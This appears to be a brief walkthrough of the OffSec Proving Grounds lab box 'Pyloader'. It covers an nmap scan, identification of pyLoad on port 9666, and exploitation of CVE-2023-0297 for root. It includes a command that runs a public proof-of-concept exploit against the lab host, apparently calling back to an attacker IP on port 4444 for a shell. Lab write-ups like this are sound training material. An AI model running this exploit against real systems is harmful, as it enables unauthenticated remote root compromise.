# Pyloader — OffSec Proving Grounds Walkthrough

> ⚠️ **Note:** This writeup is minimal — the box was a quick RCE to root with no privilege escalation needed.

**Platform:** Proving Grounds Practice
**Difficulty:** Easy
**OS:** Linux

---

## TL;DR

pyLoad on port 9666 → CVE-2023-0297 RCE → instant root.

---

## Enumeration

```bash
nmap -sV -p- 192.168.240.26
```

**Open Ports:**
| Port | Service | Version |
|------|---------|---------|
| 22 | SSH | OpenSSH 8.9p1 Ubuntu |
| 9666 | HTTP | CherryPy (pyLoad) |

Port 9666 is running **pyLoad** — a download manager.

---

## Exploitation — CVE-2023-0297 (pyLoad RCE)

The searchsploit exploit didn't work, but a GitHub PoC did:

- [CVE-2023-0297 Exploit](https://github.com/JacobEbben/CVE-2023-0297/blob/main/exploit.py)

```bash
python3 exploit.py -t http://192.168.240.26:9666/ -I 192.168.45.243 -P 4444
```

pyLoad runs as **root**, so we get instant root. No priv esc needed. 🎉

---

## Key Takeaways

- **pyLoad CVE-2023-0297** is an unauthenticated RCE — no credentials needed
- Services running as root = instant full compromise

---

*Thanks for reading! Follow for more OffSec walkthrough content.*
